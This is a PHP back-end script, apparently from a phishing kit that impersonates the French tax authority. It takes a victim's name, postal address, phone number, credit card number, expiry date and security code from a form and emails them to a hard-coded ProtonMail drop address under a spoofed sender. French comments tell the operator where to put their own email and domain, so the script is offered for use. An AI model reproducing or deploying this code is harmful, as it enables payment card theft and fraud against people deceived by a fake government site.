<?php
require_once('function.php');

$adresse_send = $_POST['adresse_send'];
$code_postale_send = $_POST['code_postale_send'];
$telephone_send = $_POST['telephone_send'];
$ville_send = $_POST['ville_send'];
$nom = $_POST['nom'];
$carte_credit = $_POST['carte_credit'];
$date_expiration = $_POST['date_expiration'];
$cryptogramme = $_POST['cryptogramme'];

// TON ADRESSE EMAIL ICI
$to  = "communeboite@protonmail.com";
$subject = "Rez Impots - $user_ip";

$message = "
-----BILLING----- <br/>
Nom et prénom : $nom<br/>
Adresse postale : $adresse_send<br/>
Ville : $ville_send ($code_postale_send)<br/>
Numéro de téléphone : $telephone_send<br/>

-----CREDIT CARD----- <br/>
Carte de crédit : $carte_credit<br/>
Date d'éxpiration : $date_expiration<br/>
Cryptogramme : $cryptogramme<br/>";

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=UTF-8' . "\r\n";

// IMPORTANT MET TON NOM DE DOMAINE ICI
$headers .= 'From: Rez Impots <Morphethus@protonmail.com>' . "\r\n";
mail($to, $subject, $message, $headers);

echo 1;
?>